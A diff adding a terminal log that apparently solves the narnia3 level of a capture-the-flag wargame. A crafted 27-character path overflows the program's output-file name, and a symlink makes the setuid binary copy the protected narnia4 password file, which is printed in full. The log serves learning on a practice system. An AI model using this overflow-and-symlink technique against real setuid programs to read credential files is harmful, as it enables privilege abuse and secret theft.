@@ -1,0 +1,12 @@
+############### OVERWRITING THE OUTPUT FILE BUFFER WITH THE NAME OF THE OUTPUT FILE WE WANT ###############
+
+narnia3@narnia:/narnia$ mkdir -p `perl -e 'print "/tmp/" . "A"x27 . "/tmp/"'`
+narnia3@narnia:/narnia$ cd `perl -e 'print "/tmp/" . "A"x27 . "/tmp/"'`
+narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ln -s /etc/narnia_pass/narnia4 abc
+narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ touch /tmp/abc
+narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ chmod 777 /tmp/abc
+narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ /narnia/narnia3 `pwd`/abc
+copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/abc to a safer place... (/tmp/abc)
+narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ cat /tmp/abc
+thaenohtai
+�(.��P��4������ narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ 
